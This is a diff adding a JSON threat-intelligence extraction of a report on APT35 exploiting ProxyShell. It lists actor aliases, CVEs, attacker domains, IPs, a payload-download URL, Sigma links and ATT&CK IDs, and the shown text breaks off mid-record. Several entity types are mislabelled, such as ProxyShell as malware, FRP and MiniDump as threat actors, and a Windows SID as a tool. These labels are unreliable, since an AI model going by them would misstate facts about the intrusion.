@@ -1,0 +1,5103 @@
+{
+  "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+  "title": "APT35 Automates Initial Access Using ProxyShell",
+  "source": null,
+  "published_date": "March 21, 2022",
+  "report_metadata": {
+    "file_name": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022).pdf",
+    "file_path": "/root/APTtext/TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022).pdf",
+    "source_type": "pdf",
+    "char_length": 30940,
+    "report_profile": "incident_response"
+  },
+  "entities": [
+    {
+      "id": "ent_threatactor_APT35",
+      "type": "ThreatActor",
+      "name": "APT35",
+      "normalized_name": "APT35",
+      "aliases": [
+        "COBALT ILLUSION",
+        "Charming Kitten",
+        "ITG18",
+        "Newscaster",
+        "Phosphorus"
+      ],
+      "confidence": 0.95,
+      "evidence_ids": [
+        "ev_4"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_4",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_threatactor_TA453",
+      "type": "ThreatActor",
+      "name": "TA453",
+      "normalized_name": "TA453",
+      "aliases": [],
+      "confidence": 0.95,
+      "evidence_ids": [
+        "ev_4"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_4",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_malware_ProxyShell",
+      "type": "Malware",
+      "name": "ProxyShell",
+      "normalized_name": "ProxyShell",
+      "aliases": [],
+      "confidence": 0.86,
+      "evidence_ids": [],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "family": "ProxyShell",
+      "sources": [
+        "title_derive"
+      ],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_cve_CVE-2021-31207",
+      "type": "CVE",
+      "name": "CVE-2021-31207",
+      "normalized_name": "CVE-2021-31207",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_68"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_68",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_cve_CVE-2021-34473",
+      "type": "CVE",
+      "name": "CVE-2021-34473",
+      "normalized_name": "CVE-2021-34473",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_68",
+        "ev_69"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_68",
+      "supporting_evidence_ids": [
+        "ev_69"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_cve_CVE-2021-34523",
+      "type": "CVE",
+      "name": "CVE-2021-34523",
+      "normalized_name": "CVE-2021-34523",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_68"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_68",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    }
+  ],
+  "observations": [
+    {
+      "id": "ent_threatactor_Charming_Kitten",
+      "type": "ThreatActor",
+      "name": "Charming Kitten",
+      "normalized_name": "Charming Kitten",
+      "aliases": [],
+      "confidence": 0.85,
+      "evidence_ids": [
+        "ev_4"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "sources": [
+        "derived",
+        "llm",
+        "rule"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "alias_mention",
+      "alias_for": "ent_threatactor_APT35"
+    },
+    {
+      "id": "ent_threatactor_COBALT_ILLUSION",
+      "type": "ThreatActor",
+      "name": "COBALT ILLUSION",
+      "normalized_name": "COBALT ILLUSION",
+      "aliases": [],
+      "confidence": 0.85,
+      "evidence_ids": [
+        "ev_4"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "sources": [
+        "derived",
+        "llm",
+        "rule"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "alias_mention",
+      "alias_for": "ent_threatactor_APT35"
+    },
+    {
+      "id": "ent_threatactor_FRP",
+      "type": "ThreatActor",
+      "name": "FRP",
+      "normalized_name": "FRP",
+      "aliases": [
+        "FastReverseProxy"
+      ],
+      "confidence": 0.95,
+      "evidence_ids": [
+        "ev_55"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_55",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "demoted_candidate"
+    },
+    {
+      "id": "ent_threatactor_ITG18",
+      "type": "ThreatActor",
+      "name": "ITG18",
+      "normalized_name": "ITG18",
+      "aliases": [],
+      "confidence": 0.85,
+      "evidence_ids": [
+        "ev_4"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "sources": [
+        "derived",
+        "llm",
+        "rule"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "alias_mention",
+      "alias_for": "ent_threatactor_APT35"
+    },
+    {
+      "id": "ent_threatactor_MiniDump",
+      "type": "ThreatActor",
+      "name": "MiniDump",
+      "normalized_name": "MiniDump",
+      "aliases": [
+        "Get-Process lsass"
+      ],
+      "confidence": 0.95,
+      "evidence_ids": [
+        "ev_46"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_46",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "demoted_candidate"
+    },
+    {
+      "id": "ent_threatactor_Newscaster",
+      "type": "ThreatActor",
+      "name": "Newscaster",
+      "normalized_name": "Newscaster",
+      "aliases": [],
+      "confidence": 0.85,
+      "evidence_ids": [
+        "ev_4"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "sources": [
+        "derived",
+        "llm",
+        "rule"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "alias_mention",
+      "alias_for": "ent_threatactor_APT35"
+    },
+    {
+      "id": "ent_threatactor_Phosphorus",
+      "type": "ThreatActor",
+      "name": "Phosphorus",
+      "normalized_name": "Phosphorus",
+      "aliases": [],
+      "confidence": 0.85,
+      "evidence_ids": [
+        "ev_4"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "sources": [
+        "derived",
+        "llm",
+        "rule"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "alias_mention",
+      "alias_for": "ent_threatactor_APT35"
+    },
+    {
+      "id": "ent_tool_Cobalt_Strike",
+      "type": "Tool",
+      "name": "Cobalt Strike",
+      "normalized_name": "Cobalt Strike",
+      "aliases": [],
+      "confidence": 0.93,
+      "evidence_ids": [
+        "ev_15"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_15",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "tool_name": "Cobalt Strike",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "demoted_candidate"
+    },
+    {
+      "id": "ent_tool_S-1-5-18",
+      "type": "Tool",
+      "name": "S-1-5-18",
+      "normalized_name": "S-1-5-18",
+      "aliases": [],
+      "confidence": 0.93,
+      "evidence_ids": [
+        "ev_41",
+        "ev_42"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_41",
+      "supporting_evidence_ids": [
+        "ev_42"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "tool_name": "S-1-5-18",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "demoted_candidate"
+    },
+    {
+      "id": "ent_domain_api.myip.com",
+      "type": "Domain",
+      "name": "api.myip.com",
+      "normalized_name": "api.myip.com",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_33"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "api.myip.com",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_33",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "network_ioc"
+    },
+    {
+      "id": "ent_domain_github.com",
+      "type": "Domain",
+      "name": "github.com",
+      "normalized_name": "github.com",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_118"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "github.com",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_118",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "network_ioc"
+    },
+    {
+      "id": "ent_domain_kcp53.msupdate.us",
+      "type": "Domain",
+      "name": "kcp53.msupdate.us",
+      "normalized_name": "kcp53.msupdate.us",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_33",
+        "ev_56"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "kcp53.msupdate.us",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_56",
+      "supporting_evidence_ids": [
+        "ev_33"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "network_ioc"
+    },
+    {
+      "id": "ent_domain_tcp443.msupdate.us",
+      "type": "Domain",
+      "name": "tcp443.msupdate.us",
+      "normalized_name": "tcp443.msupdate.us",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_33",
+        "ev_56"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "tcp443.msupdate.us",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_56",
+      "supporting_evidence_ids": [
+        "ev_33"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "network_ioc"
+    },
+    {
+      "id": "ent_ipv4_107.173.231.114",
+      "type": "IPv4",
+      "name": "107.173.231.114",
+      "normalized_name": "107.173.231.114",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_56"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "107.173.231.114",
+      "ioc_type": "ipv4",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_56",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "invalid_ioc"
+    },
+    {
+      "id": "ent_ipv4_148.251.71.182",
+      "type": "IPv4",
+      "name": "148.251.71.182",
+      "normalized_name": "148.251.71.182",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_29",
+        "ev_70",
+        "ev_73"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "148.251.71.182",
+      "ioc_type": "ipv4",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_70",
+      "supporting_evidence_ids": [
+        "ev_73",
+        "ev_29"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "invalid_ioc"
+    },
+    {
+      "id": "ent_url_http_148.251.71.182_update.tmp",
+      "type": "URL",
+      "name": "http://148.251.71.182/update.tmp",
+      "normalized_name": "http://148.251.71.182/update.tmp",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_29",
+        "ev_70",
+        "ev_73"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "http://148.251.71.182/update.tmp",
+      "ioc_type": "url",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_73",
+      "supporting_evidence_ids": [
+        "ev_70",
+        "ev_29"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "network_ioc"
+    },
+    {
+      "id": "ent_url_https_github.com_SigmaHQ_sigma_blob_04f72b9e78f196544f8f1331b4d9158df34d7ecf_ru",
+      "type": "URL",
+      "name": "https://github.com/SigmaHQ/sigma/blob/04f72b9e78f196544f8f1331b4d9158df34d7ecf/ru",
+      "normalized_name": "https://github.com/SigmaHQ/sigma/blob/04f72b9e78f196544f8f1331b4d9158df34d7ecf/ru",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_118"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "https://github.com/SigmaHQ/sigma/blob/04f72b9e78f196544f8f1331b4d9158df34d7ecf/ru",
+      "ioc_type": "url",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_118",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "network_ioc"
+    },
+    {
+      "id": "ent_url_https_github.com_SigmaHQ_sigma_blob_1425ede905514b7dbf3c457561aaf2ff27274724_ru",
+      "type": "URL",
+      "name": "https://github.com/SigmaHQ/sigma/blob/1425ede905514b7dbf3c457561aaf2ff27274724/ru",
+      "normalized_name": "https://github.com/SigmaHQ/sigma/blob/1425ede905514b7dbf3c457561aaf2ff27274724/ru",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_118"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "https://github.com/SigmaHQ/sigma/blob/1425ede905514b7dbf3c457561aaf2ff27274724/ru",
+      "ioc_type": "url",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_118",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "network_ioc"
+    },
+    {
+      "id": "ent_url_https_github.com_SigmaHQ_sigma_blob_1cfca93354d25e458db40f8d48403602b46bbf03",
+      "type": "URL",
+      "name": "https://github.com/SigmaHQ/sigma/blob/1cfca93354d25e458db40f8d48403602b46bbf03",
+      "normalized_name": "https://github.com/SigmaHQ/sigma/blob/1cfca93354d25e458db40f8d48403602b46bbf03",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_118"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "https://github.com/SigmaHQ/sigma/blob/1cfca93354d25e458db40f8d48403602b46bbf03",
+      "ioc_type": "url",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_118",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "network_ioc"
+    },
+    {
+      "id": "ent_url_https_github.com_SigmaHQ_sigma_blob_1ff5e226ad8bed34916c16ccc77ba281ca3203ae_ru",
+      "type": "URL",
+      "name": "https://github.com/SigmaHQ/sigma/blob/1ff5e226ad8bed34916c16ccc77ba281ca3203ae/ru",
+      "normalized_name": "https://github.com/SigmaHQ/sigma/blob/1ff5e226ad8bed34916c16ccc77ba281ca3203ae/ru",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_118"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "https://github.com/SigmaHQ/sigma/blob/1ff5e226ad8bed34916c16ccc77ba281ca3203ae/ru",
+      "ioc_type": "url",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_118",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "network_ioc"
+    },
+    {
+      "id": "ent_url_https_github.com_SigmaHQ_sigma_blob_503df469687fe4d14d2119a95723485d079ec0d9_",
+      "type": "URL",
+      "name": "https://github.com/SigmaHQ/sigma/blob/503df469687fe4d14d2119a95723485d079ec0d9/",
+      "normalized_name": "https://github.com/SigmaHQ/sigma/blob/503df469687fe4d14d2119a95723485d079ec0d9/",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_118"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "https://github.com/SigmaHQ/sigma/blob/503df469687fe4d14d2119a95723485d079ec0d9/",
+      "ioc_type": "url",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_118",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "network_ioc"
+    },
+    {
+      "id": "ent_url_https_github.com_SigmaHQ_sigma_blob_57cdfd261266b81255e330723f4adf270fc4c4f8_r",
+      "type": "URL",
+      "name": "https://github.com/SigmaHQ/sigma/blob/57cdfd261266b81255e330723f4adf270fc4c4f8/r",
+      "normalized_name": "https://github.com/SigmaHQ/sigma/blob/57cdfd261266b81255e330723f4adf270fc4c4f8/r",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_118"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "https://github.com/SigmaHQ/sigma/blob/57cdfd261266b81255e330723f4adf270fc4c4f8/r",
+      "ioc_type": "url",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_118",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "network_ioc"
+    },
+    {
+      "id": "ent_url_https_github.com_SigmaHQ_sigma_blob_682e0458a336c3a6e93b18f7e972e1d67ef01598_r",
+      "type": "URL",
+      "name": "https://github.com/SigmaHQ/sigma/blob/682e0458a336c3a6e93b18f7e972e1d67ef01598/r",
+      "normalized_name": "https://github.com/SigmaHQ/sigma/blob/682e0458a336c3a6e93b18f7e972e1d67ef01598/r",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_118"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "https://github.com/SigmaHQ/sigma/blob/682e0458a336c3a6e93b18f7e972e1d67ef01598/r",
+      "ioc_type": "url",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_118",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "network_ioc"
+    },
+    {
+      "id": "ent_url_https_github.com_SigmaHQ_sigma_blob_6f5271275e9ac22be9ded8b9252bce064e524153_",
+      "type": "URL",
+      "name": "https://github.com/SigmaHQ/sigma/blob/6f5271275e9ac22be9ded8b9252bce064e524153/",
+      "normalized_name": "https://github.com/SigmaHQ/sigma/blob/6f5271275e9ac22be9ded8b9252bce064e524153/",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_118"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "https://github.com/SigmaHQ/sigma/blob/6f5271275e9ac22be9ded8b9252bce064e524153/",
+      "ioc_type": "url",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_118",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "network_ioc"
+    },
+    {
+      "id": "ent_url_https_github.com_SigmaHQ_sigma_blob_777d218adc789b7f1b146701793e78799324d87d_",
+      "type": "URL",
+      "name": "https://github.com/SigmaHQ/sigma/blob/777d218adc789b7f1b146701793e78799324d87d/",
+      "normalized_name": "https://github.com/SigmaHQ/sigma/blob/777d218adc789b7f1b146701793e78799324d87d/",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_118"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "https://github.com/SigmaHQ/sigma/blob/777d218adc789b7f1b146701793e78799324d87d/",
+      "ioc_type": "url",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_118",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "network_ioc"
+    },
+    {
+      "id": "ent_url_https_github.com_SigmaHQ_sigma_blob_98d7380a40d503ffd225420f7318b79d9f5097b8",
+      "type": "URL",
+      "name": "https://github.com/SigmaHQ/sigma/blob/98d7380a40d503ffd225420f7318b79d9f5097b8",
+      "normalized_name": "https://github.com/SigmaHQ/sigma/blob/98d7380a40d503ffd225420f7318b79d9f5097b8",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_118"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "https://github.com/SigmaHQ/sigma/blob/98d7380a40d503ffd225420f7318b79d9f5097b8",
+      "ioc_type": "url",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_118",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "network_ioc"
+    },
+    {
+      "id": "ent_url_https_github.com_SigmaHQ_sigma_blob_ab814cbc408234eddf538bc893fcbe00c32ca2e9_",
+      "type": "URL",
+      "name": "https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/",
+      "normalized_name": "https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_118"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/",
+      "ioc_type": "url",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_118",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "network_ioc"
+    },
+    {
+      "id": "ent_url_https_github.com_SigmaHQ_sigma_blob_b81839e3ce507df925d6e583e569e1ac3a3894ab_",
+      "type": "URL",
+      "name": "https://github.com/SigmaHQ/sigma/blob/b81839e3ce507df925d6e583e569e1ac3a3894ab/",
+      "normalized_name": "https://github.com/SigmaHQ/sigma/blob/b81839e3ce507df925d6e583e569e1ac3a3894ab/",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_118"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "https://github.com/SigmaHQ/sigma/blob/b81839e3ce507df925d6e583e569e1ac3a3894ab/",
+      "ioc_type": "url",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_118",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "network_ioc"
+    },
+    {
+      "id": "ent_url_https_github.com_SigmaHQ_sigma_blob_ed4e771700681b36eb8dd74a13dffc94c857bb46_",
+      "type": "URL",
+      "name": "https://github.com/SigmaHQ/sigma/blob/ed4e771700681b36eb8dd74a13dffc94c857bb46/",
+      "normalized_name": "https://github.com/SigmaHQ/sigma/blob/ed4e771700681b36eb8dd74a13dffc94c857bb46/",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_118"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "https://github.com/SigmaHQ/sigma/blob/ed4e771700681b36eb8dd74a13dffc94c857bb46/",
+      "ioc_type": "url",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_118",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "network_ioc"
+    },
+    {
+      "id": "ent_technique_T1003",
+      "type": "Technique",
+      "name": "T1003",
+      "normalized_name": "T1003",
+      "aliases": [],
+      "confidence": 0.98,
+      "evidence_ids": [
+        "ev_142"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "technique_id": "T1003",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_142",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "technique_scope": "observed",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "observed_technique"
+    },
+    {
+      "id": "ent_technique_T1016",
+      "type": "Technique",
+      "name": "T1016",
+      "normalized_name": "T1016",
+      "aliases": [],
+      "confidence": 0.98,
+      "evidence_ids": [
+        "ev_142"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "technique_id": "T1016",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_142",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "technique_scope": "observed",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "observed_technique"
+    },
+    {
+      "id": "ent_technique_T1033",
+      "type": "Technique",
+      "name": "T1033",
+      "normalized_name": "T1033",
+      "aliases": [],
+      "confidence": 0.98,
+      "evidence_ids": [
+        "ev_142"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "technique_id": "T1033",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_142",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "technique_scope": "observed",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "observed_technique"
+    },
+    {
+      "id": "ent_technique_T1036.005",
+      "type": "Technique",
+      "name": "T1036.005",
+      "normalized_name": "T1036.005",
+      "aliases": [],
+      "confidence": 0.98,
+      "evidence_ids": [
+        "ev_142"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "technique_id": "T1036.005",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_142",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
